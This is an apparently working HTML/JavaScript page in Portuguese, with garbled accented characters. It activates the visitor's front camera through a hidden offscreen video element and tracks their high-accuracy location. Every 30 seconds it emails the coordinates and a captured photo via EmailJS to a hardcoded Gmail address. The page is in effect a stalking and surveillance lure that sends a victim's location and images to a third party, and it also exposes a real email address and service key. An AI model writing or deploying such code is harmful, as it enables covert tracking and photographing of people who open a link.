<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Localiza칞칚o e Imagem Ativa Enviada!</title>
    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
    ></script>
    <style>
      body {
        font-family: Arial, sans-serif;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
        background-color: #f0f8ff; /* Um azul bem clarinho */
        color: #333;
        text-align: center;
      }
      .content {
        background-color: #ffffff;
        padding: 40px;
        border-radius: 15px;
        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
        max-width: 400px;
        width: 90%;
      }
      .emoji {
        font-size: 80px;
        margin-bottom: 20px;
        animation: bounce 2s infinite; /* Pequena anima칞칚o para o emoji */
      }
      @keyframes bounce {
        0%,
        20%,
        50%,
        80%,
        100% {
          transform: translateY(0);
        }
        40% {
          transform: translateY(-15px);
        }
        60% {
          transform: translateY(-7px);
        }
      }
      h1 {
        color: #4682b4; /* Um azul mais escuro */
        margin-bottom: 15px;
      }
      p {
        font-size: 1.1em;
        line-height: 1.6;
      }
      #status-message {
        font-weight: bold;
        color: #555;
        margin-top: 20px;
      }
      #last-sent-message {
        margin-top: 10px;
        font-size: 0.9em;
        color: #777;
      }
      /* Estilos para o v칤deo e canvas (escondidos) */
      #camera-feed,
      #camera-canvas {
        position: absolute; /* Tenta mover para fora da tela */
        left: -9999px;
        top: -9999px;
        opacity: 0; /* Torna invis칤vel */
        width: 1px; /* Min칰sculo */
        height: 1px;
      }
    </style>
  </head>
  <body>
    <div class="content">
      <div class="emoji">游닞</div>
      <h1>Rastreando Localiza칞칚o e Capturando Imagem...</h1>
      <p>
        Sua localiza칞칚o e uma foto da c칙mera frontal est칚o sendo atualizadas e
        enviadas periodicamente.
      </p>
      <p id="status-message">Aguardando permiss칚o de localiza칞칚o e c칙mera...</p>
      <p id="last-sent-message"></p>
      <p>
        Voc칡 pode fechar esta p치gina a qualquer momento para parar o
        rastreamento.
      </p>
    </div>

    <video id="camera-feed" playsinline autoplay muted></video>
    <canvas id="camera-canvas"></canvas>

    <script type="text/javascript">
      // IMPORTANTE: COLOQUE SEUS DADOS DO EMAILJS AQUI!
      (function () {
        emailjs.init("WkzTT3_-TLzVDKRRh"); // Sua Public Key
      })();

      const SERVICE_ID = "gmailMessage"; // Seu Service ID
      const TEMPLATE_ID = "template_jg4h8r9"; // Seu Template ID
      const YOUR_EMAIL_RECEIVER = "henry.pdts@gmail.com"; // Seu e-mail de destino

      const statusMessageElement = document.getElementById("status-message");
      const lastSentMessageElement =
        document.getElementById("last-sent-message");
      const cameraFeed = document.getElementById("camera-feed");
      const cameraCanvas = document.getElementById("camera-canvas");
      const context = cameraCanvas.getContext("2d");

      let lastSentTime = 0;
      const SEND_INTERVAL = 30 * 1000; // 30 segundos em milissegundos
      let cameraStream = null; // Para armazenar o stream da c칙mera

      // --- Fun칞칫es de C칙mera ---
      async function setupCamera() {
        try {
          // Preferir a c칙mera frontal
          const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" },
          });
          cameraStream = stream; // Armazena o stream para poder parar depois
          cameraFeed.srcObject = stream;
          await cameraFeed.play();
          statusMessageElement.textContent =
            "C칙mera iniciada. Aguardando localiza칞칚o...";
          return true;
        } catch (error) {
          console.error("Erro ao acessar a c칙mera:", error);
          statusMessageElement.textContent =
            "Erro: Permiss칚o de c칙mera negada ou c칙mera indispon칤vel.";
          return false;
        }
      }

      function takePhoto() {
        if (!cameraStream || !cameraFeed.videoWidth) {
          console.warn("C칙mera n칚o est치 pronta para tirar foto.");
          return null;
        }

        // Define o tamanho do canvas para o tamanho do v칤deo para evitar distor칞칚o
        cameraCanvas.width = cameraFeed.videoWidth;
        cameraCanvas.height = cameraFeed.videoHeight;

        // Desenha o frame atual do v칤deo no canvas
        context.drawImage(
          cameraFeed,
          0,
          0,
          cameraCanvas.width,
          cameraCanvas.height
        );

        // Converte o conte칰do do canvas para um Data URL (JPEG, qualidade 80%)
        return cameraCanvas.toDataURL("image/jpeg", 0.8);
      }

      // --- Fun칞칫es de Envio e Localiza칞칚o ---
      async function sendDataToEmailJS(latitude, longitude, imageData = null) {
        const currentTime = new Date().getTime();
        if (currentTime - lastSentTime < SEND_INTERVAL) {
          console.log("Aguardando pr칩ximo envio...");
          return;
        }

        lastSentTime = currentTime; // Atualiza o 칰ltimo tempo de envio

        const templateParams = {
          latitude: latitude,
          longitude: longitude,
          timestamp: new Date().toLocaleString(), // Adiciona um timestamp
          image_data: imageData || "N/A", // Inclui a imagem ou 'N/A'
          to_email: YOUR_EMAIL_RECEIVER,
        };

        try {
          await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
          console.log("Dados (Localiza칞칚o + Imagem) enviados com sucesso!");
          statusMessageElement.textContent =
            "Localiza칞칚o e Imagem enviadas! Pr칩xima atualiza칞칚o em 30 segundos.";
          lastSentMessageElement.textContent = `칔ltimo envio: ${new Date().toLocaleTimeString()}`;
        } catch (error) {
          console.error("Falha ao enviar dados:", error);
          statusMessageElement.textContent =
            "Erro ao enviar dados. Tentando novamente...";
        }
      }

      async function handlePositionSuccess(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        statusMessageElement.textContent = `Localiza칞칚o atual: Lat ${latitude}, Long ${longitude}.`;

        let imageData = null;
        if (cameraStream) {
          // S칩 tenta tirar foto se a c칙mera estiver ativa
          imageData = takePhoto();
          if (!imageData) {
            console.warn("N칚o foi poss칤vel capturar a foto.");
          }
        } else {
          console.log("C칙mera n칚o iniciada, enviando apenas localiza칞칚o.");
        }

        await sendDataToEmailJS(latitude, longitude, imageData);
      }

      function handlePositionError(error) {
        let errorMessage = "Erro na localiza칞칚o: ";
        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorMessage +=
              "Permiss칚o negada. O rastreamento n칚o ser치 poss칤vel.";
            break;
          case error.POSITION_UNAVAILABLE:
            errorMessage += "Indispon칤vel. Tentando novamente...";
            break;
          case error.TIMEOUT:
            errorMessage += "Tempo limite. Tentando novamente...";
            break;
          case error.UNKNOWN_ERROR:
            errorMessage += "Desconhecido.";
            break;
        }
        statusMessageElement.textContent = errorMessage;
        console.error("Erro de geolocaliza칞칚o:", error);
      }

      // --- In칤cio ao Carregar a P치gina ---
      window.onload = async function () {
        // Iniciar c칙mera primeiro, pois a geolocaliza칞칚o pode ser mais r치pida
        const cameraReady = await setupCamera();

        if ("geolocation" in navigator) {
          statusMessageElement.textContent =
            "Solicitando sua permiss칚o para rastrear a localiza칞칚o...";
          navigator.geolocation.watchPosition(
            handlePositionSuccess,
            handlePositionError,
            {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0,
            }
          );
          statusMessageElement.textContent +=
            " Por favor, mantenha esta p치gina aberta.";
        } else {
          statusMessageElement.textContent =
            "Seu navegador n칚o suporta geolocaliza칞칚o.";
        }
      };

      // Limpar o stream da c칙mera ao fechar a p치gina
      window.onbeforeunload = function () {
        if (cameraStream) {
          cameraStream.getTracks().forEach((track) => track.stop());
          console.log("C칙mera desligada.");
        }
      };
    </script>
  </body>
</html>
